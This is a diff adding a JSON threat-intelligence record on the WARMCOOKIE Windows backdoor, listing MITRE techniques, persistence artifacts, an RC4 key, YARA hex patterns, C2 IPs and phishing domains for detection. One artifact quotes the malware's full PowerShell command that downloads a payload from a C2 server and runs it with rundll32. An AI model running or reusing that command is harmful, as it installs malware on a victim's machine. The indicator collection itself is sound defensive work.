@@ -1,0 +1,277 @@
+{
+  "malware_family": "WARMCOOKIE",
+  "threat_actor": "REF6127",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "WARMCOOKIE is a Windows backdoor distributed via phishing campaigns that use recruiting-themed lures. It fingerprints victim machines, captures screenshots, and can execute commands or deploy additional payloads. It uses a scheduled task for persistence and communicates over HTTP, sending RC4-encrypted and Base64-encoded data within the Cookie header.",
+  "mitre_techniques": [
+    "T1566",
+    "T1204.001",
+    "T1059.001",
+    "T1082",
+    "T1053.005",
+    "T1113",
+    "T1059.003"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "command_line",
+      "value": "start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\\' + [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source 'http://80.66.88.146/data/5fb6dd81093a0d6812c17b12f139ce35' -Destination $d; if (![System.IO.File]::Exists($d)) {exit}; $p = $d + ',Start'; rundll32.exe $p; Start-Sleep -Seconds 10} -Argument 0 | wait-job | Receive-Job",
+      "context": "Executed by obfuscated JavaScript to download and run WARMCOOKIE.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "\"C:\\WINDOWS\\system32\\rundll32.exe\" \"C:\\ProgramData\\RtlUpd\\RtlUpd.dll\",Start /p",
+      "context": "Persistence command line executed by the scheduled task.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "cmd.exe /c %ls",
+      "context": "Format string for command execution handler (ID 4).",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\RtlUpd\\RtlUpd.dll",
+      "context": "Persistence location for the WARMCOOKIE DLL.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "Update_23_04_2024_5689382.js",
+      "context": "Example name of the downloaded initial JavaScript file.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "RtlUpd.dll",
+      "context": "Name of the main payload DLL.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "scheduled_task",
+      "value": "RtlUpd",
+      "context": "Task name for persistence, runs every 10 minutes.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "export_name",
+      "value": "Start",
+      "context": "Export used to execute the WARMCOOKIE DLL.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "mutex",
+      "value": "f92e6f3c-9cc3-4be0-966c-1be421e69140",
+      "context": "Example of a hardcoded GUID-like mutex.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "mutex",
+      "value": "91f785f4-2fa4-4c85-954d-b96768ca76f2",
+      "context": "Example of a hardcoded GUID-like mutex.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
+      "context": "Enumerated to retrieve list of installed programs (Command ID 3).",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "24de21a8dc08434c",
+      "context": "Hardcoded RC4 key embedded in each sample.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "0xEDB88320",
+      "context": "CRC32 polynomial constant used in checksum function.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "ERROR: Cannot write file",
+      "context": "Status message sent to C2 on file write failure.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "OK (See 'Files' tab)",
+      "context": "Status message sent to C2 on successful file read.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Cookie:",
+      "context": "String used to construct C2 request.",
+      "specificity": "medium",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 45 8D 5D ?? 45 33 C0 41 83 E3 ?? 49 8D 4E ?? 44 03 DB 41 8D 53 ?? }",
+      "context": "YARA pattern for the checksum function.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "hex_pattern",
+      "value": "{ 8B 69 04 48 8D 79 08 8B 31 89 6C 24 ?? 48 8D 4E ?? E8 }",
+      "context": "YARA pattern for the string decryption routine.",
+      "specificity": "high",
+      "evidence": "strings_listing",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "REGISTRATION = 1",
+      "context": "C2 protocol request type for initial registration.",
+      "specificity": "high",
+      "evidence": "source_identifier",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "user_agent",
+      "value": "Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;.NET CLR 1.0.3705)",
+      "context": "Hardcoded User-Agent for all C2 communications.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "80.66.88.146",
+      "context": "C2 server used to host and download the WARMCOOKIE payload.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.49.69.41",
+      "context": "C2 server used for command and control.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.9.74.135",
+      "context": "IP address hosting the phishing landing pages.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "assets.work-for.top",
+      "context": "Phishing landing page domain.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "omeindia.com",
+      "context": "Domain used for initial phishing link.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/data/5fb6dd81093a0d6812c17b12f139ce35",
+      "context": "Path used to download the WARMCOOKIE DLL.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "ccde1ded028948f5cd3277d2d4af6b22fa33f53abde84ea2aa01f1872fad1d13",
+      "description": "WARMCOOKIE payload (RtlUpd.dll)"
+    }
+  ],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
